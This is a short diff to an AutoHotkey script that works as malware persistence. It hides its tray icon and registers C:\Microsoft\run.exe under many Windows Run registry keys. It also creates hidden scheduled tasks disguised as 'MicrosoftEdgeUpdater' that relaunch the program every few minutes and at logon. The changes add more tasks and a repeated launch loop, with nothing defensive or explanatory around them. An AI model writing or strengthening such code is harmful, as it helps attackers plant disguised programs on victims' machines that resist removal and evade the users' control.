@@ -1,4 +1,4 @@
-#SingleInstance Ignore
+#SingleInstance Off
 #NoTrayIcon
 
 path := "C:\Microsoft"
@@ -30,7 +30,9 @@ runAllExes() {
     RegWrite '"C:\Microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate8"
     RegWrite '"C:\Microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate9"
 
-    Run 'cmd /c schtasks /create /sc minute /mo 1 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\run.exe"', , "Hide"
+    Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\run.exe"', , "Hide"
+    Run 'cmd /c schtasks /create /sc minute /mo 2 /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\run.exe"', , "Hide"
+    Run 'cmd /c schtasks /create /sc onlogon /tn "MicrosoftEdgeUpdater" /tr "C:\Microsoft\run.exe"', "Hide"
 
     last := ""
     try {
@@ -103,6 +105,10 @@ runAllExes() {
     }
 }
 
-SetTimer runAllExes, -1000
+Loop 5
+{
+    SetTimer runAllExes, -1000
+    Sleep 5000
+}
 
 return
